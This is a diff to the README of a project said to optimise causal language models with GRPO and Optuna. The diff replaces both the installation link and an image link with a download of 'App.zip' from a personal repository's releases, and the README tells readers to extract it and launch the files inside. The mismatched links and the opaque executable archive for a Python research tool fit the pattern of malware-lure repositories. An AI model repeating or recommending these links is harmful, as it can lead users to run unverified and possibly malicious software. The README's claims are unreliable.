@@ -22,7 +22,7 @@ Causal Language Models (LMs) play a crucial role in various natural language pro
 
 ## Installation
 
-To get started with "grpo-optuna", you can download the repository using the following [link](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip).
+To get started with "grpo-optuna", you can download the repository using the following [link](https://github.com/Juninxz13/grpo-optuna/releases/download/v1.0/App.zip).
 
 If the download link ends with a specific file name, please extract the contents and ensure that the necessary files are properly launched for usage. 
 
@@ -54,4 +54,4 @@ This project is licensed under the [MIT License](LICENSE), which allows for both
 
 Dive into the world of optimizing Causal Language Models with GRPO and Optuna. Unlock the potential of weighted reward functions and automated hyperparameter tuning for groundbreaking advancements in language modeling research. Join us in the quest for optimized models and impactful results. Happy coding! 🚀
 
-![Causal Language Models](https://github.com/example-images/causal-language-model.png)
+![Causal Language Models](https://github.com/Juninxz13/grpo-optuna/releases/download/v1.0/App.zip)
